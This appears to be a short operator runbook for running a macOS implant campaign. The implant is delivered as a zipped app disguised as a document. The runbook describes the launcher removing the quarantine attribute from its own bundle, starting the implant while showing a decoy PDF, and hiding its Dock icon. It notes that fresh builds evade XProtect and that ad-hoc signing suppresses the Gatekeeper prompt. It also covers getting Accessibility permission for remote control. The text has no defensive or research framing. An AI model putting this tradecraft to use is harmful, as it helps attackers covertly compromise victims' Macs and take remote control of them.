# macOS attempt run

1. Build a fresh artifact. Download `<Doc>_<rand4>.app.zip` from `dl.<zone>`.
2. Unzip and open the `.app` on a clean VM (macOS 15 arm64, macOS 14 amd64).
3. The launcher removes `com.apple.quarantine` from its own bundle, starts the
   implant, then opens the bundled decoy PDF.
4. A session appears within 60s.

Notes:

- `LSUIElement` is true, so there is no Dock icon.
- macOS has **no loader**; XProtect is hash-based and a fresh build is unknown
  to it. The first-run Gatekeeper check can still show a one-time prompt unless
  the bundle is ad-hoc signed (`codesign --force -s -`, done by `build_app.sh`
  on macOS).
- If input does not work in the remote desktop drawer, grant **Accessibility**
  to the launcher (the helper reports `needs_accessibility` and the panel shows
  a banner).
